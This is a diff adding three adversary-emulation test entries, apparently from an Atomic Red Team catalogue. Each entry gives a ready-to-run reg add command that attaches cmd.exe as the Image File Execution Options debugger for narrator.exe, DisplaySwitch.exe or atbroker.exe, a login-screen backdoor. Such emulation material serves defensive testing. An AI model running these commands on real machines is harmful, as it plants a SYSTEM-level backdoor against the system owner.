@@ -108,3 +108,54 @@ This allows adversaries to execute the attached process
 ```
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 ```
+
+## Atomic Test #5 - Attaches Command Prompt As Debugger To Process - narrator
+This allows adversaries to execute the attached process
+
+**Supported Platforms:** Windows
+
+#### Inputs
+
+| Name | Description | Type | Default Value | 
+|:------:|:-------------:|:------:|:---------------:|
+| target_executable | File You Want To Attach cmd To | String | narrator.exe|
+
+#### Run it with `command_prompt`!
+
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+```
+
+## Atomic Test #6 - Attaches Command Prompt As Debugger To Process - DisplaySwitch
+This allows adversaries to execute the attached process
+
+**Supported Platforms:** Windows
+
+#### Inputs
+
+| Name | Description | Type | Default Value | 
+|:------:|:-------------:|:------:|:---------------:|
+| target_executable | File You Want To Attach cmd To | String | DisplaySwitch.exe|
+
+#### Run it with `command_prompt`!
+
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+```
+
+## Atomic Test #7 - Attaches Command Prompt As Debugger To Process - AtBroker
+This allows adversaries to execute the attached process
+
+**Supported Platforms:** Windows
+
+#### Inputs
+
+| Name | Description | Type | Default Value | 
+|:------:|:-------------:|:------:|:---------------:|
+| target_executable | File You Want To Attach cmd To | String | atbroker.exe|
+
+#### Run it with `command_prompt`!
+
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+```
